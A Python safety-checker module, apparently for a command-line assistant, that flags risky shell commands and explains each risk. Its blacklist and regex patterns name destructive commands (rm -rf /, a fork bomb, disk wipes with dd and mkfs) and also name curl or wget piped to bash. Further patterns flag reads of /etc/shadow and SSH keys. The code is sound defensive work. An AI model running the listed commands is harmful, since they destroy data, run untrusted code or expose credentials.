"""
Safety Checker Module
Identifies potentially risky commands and enforces safety policies.
"""

import re
import os
import json
from config import active_config

class SafetyChecker:
    """Class for checking command safety."""
    
    def __init__(self):
        """Initialize the Safety Checker."""
        # Get risky command patterns from config
        self.risky_patterns = active_config.RISKY_COMMAND_PATTERNS
        
        # Additional patterns file
        self.patterns_file = os.path.join(os.path.dirname(__file__), '../templates/risky_patterns.json')
        self._load_additional_patterns()
        
        # Blacklisted commands (never allowed)
        self.blacklisted_commands = [
            'rm -rf /',
            'rm -rf /*',
            'rm -rf ~',
            'rm -rf ~/*',
            ':(){ :|:& };:',  # Fork bomb
            '> /dev/sda',
            'dd if=/dev/zero of=/dev/sda',
            'mkfs.ext4 /dev/sda',
            'chmod -R 777 /',
            'chmod -R 777 /*',
            'wget -O- http://example.com/script.sh | bash',
            'curl -s http://example.com/script.sh | bash'
        ]
    
    def is_risky(self, command):
        """
        Check if a command is potentially risky.
        
        Args:
            command (str): The command to check
            
        Returns:
            bool: True if the command is risky, False otherwise
        """
        # Check blacklisted commands first (exact matches)
        if any(command.strip() == blacklisted for blacklisted in self.blacklisted_commands):
            return True
        
        # Check if the command matches any risky patterns
        for pattern in self.risky_patterns:
            if re.search(pattern, command):
                return True
        
        # Check for specific dangerous operations
        return self._check_dangerous_operations(command)
    
    def _load_additional_patterns(self):
        """Load additional risky patterns from a JSON file."""
        if os.path.exists(self.patterns_file):
            try:
                with open(self.patterns_file, 'r') as f:
                    patterns = json.load(f)
                    self.risky_patterns.extend(patterns.get('patterns', []))
                    self.blacklisted_commands.extend(patterns.get('blacklisted', []))
            except Exception as e:
                print(f"Error loading additional risky patterns: {e}")
    
    def _check_dangerous_operations(self, command):
        """
        Check for specific dangerous operations.
        
        Args:
            command (str): The command to check
            
        Returns:
            bool: True if the command is dangerous, False otherwise
        """
        # Check for potentially dangerous file operations
        if re.search(r'rm\s+-[rf]\s+', command) and not re.search(r'rm\s+-[rf]\s+\.', command):
            return True
        
        # Check for system changes
        if any(cmd in command for cmd in ['shutdown', 'reboot', 'halt']):
            return True
        
        # Check for disk operations
        if any(cmd in command for cmd in ['fdisk', 'mkfs', 'dd']):
            return True
        
        # Check for sensitive file access
        if re.search(r'(cat|vi|vim|nano|grep|sed)\s+.*(/etc/passwd|/etc/shadow|\.ssh/|id_rsa)', command):
            return True
        
        # Check for potentially dangerous redirections
        if '>' in command and any(path in command for path in ['/etc/', '/bin/', '/sbin/', '/usr/']):
            return True
        
        # Check for permission changes
        if re.search(r'chmod\s+[0-7]*7[0-7]*\s+', command):
            return True
        
        return False
    
    def get_risk_explanation(self, command):
        """
        Get an explanation of why a command is risky.
        
        Args:
            command (str): The command to explain
            
        Returns:
            str: An explanation of the risk
        """
        # Check blacklisted commands
        if any(command.strip() == blacklisted for blacklisted in self.blacklisted_commands):
            return "This command is blacklisted as it can cause serious system damage."
        
        # Check for pattern matches
        for pattern in self.risky_patterns:
            if re.search(pattern, command):
                if 'rm' in pattern and '-rf' in pattern:
                    return "This command uses recursive force deletion, which can permanently delete files and directories without confirmation."
                elif 'sudo' in pattern:
                    return "This command uses sudo, which executes commands with superuser privileges and can modify system files."
                elif 'killall' in pattern:
                    return "This command can terminate multiple processes at once, potentially including essential system processes."
                elif any(cmd in pattern for cmd in ['shutdown', 'reboot', 'halt']):
                    return "This command will shut down or restart your system."
                elif any(cmd in pattern for cmd in ['fdisk', 'mkfs', 'dd']):
                    return "This command can modify disk partitions or file systems, potentially causing data loss."
                elif 'chmod 777' in pattern:
                    return "This command changes file permissions to allow access by any user, which is a security risk."
                elif 'uninstall' in pattern:
                    return "This command will uninstall software from your system."
                else:
                    return "This command matches a pattern that has been identified as potentially risky."
        
        # Check for specific dangerous operations
        if re.search(r'rm\s+-[rf]\s+', command) and not re.search(r'rm\s+-[rf]\s+\.', command):
            return "This command uses the rm command with options that could delete files recursively and without confirmation."
        
        if any(cmd in command for cmd in ['shutdown', 'reboot', 'halt']):
            return "This command will shut down or restart your system."
        
        if any(cmd in command for cmd in ['fdisk', 'mkfs', 'dd']):
            return "This command can modify disk partitions or file systems, potentially causing data loss."
        
        if re.search(r'(cat|vi|vim|nano|grep|sed)\s+.*(/etc/passwd|/etc/shadow|\.ssh/|id_rsa)', command):
            return "This command accesses sensitive system files or credentials."
        
        if '>' in command and any(path in command for path in ['/etc/', '/bin/', '/sbin/', '/usr/']):
            return "This command writes to system directories, which could modify essential system files."
        
        if re.search(r'chmod\s+[0-7]*7[0-7]*\s+', command):
            return "This command changes file permissions to allow access by any user, which is a security risk."
        
        return "This command has been identified as potentially risky, but no specific explanation is available."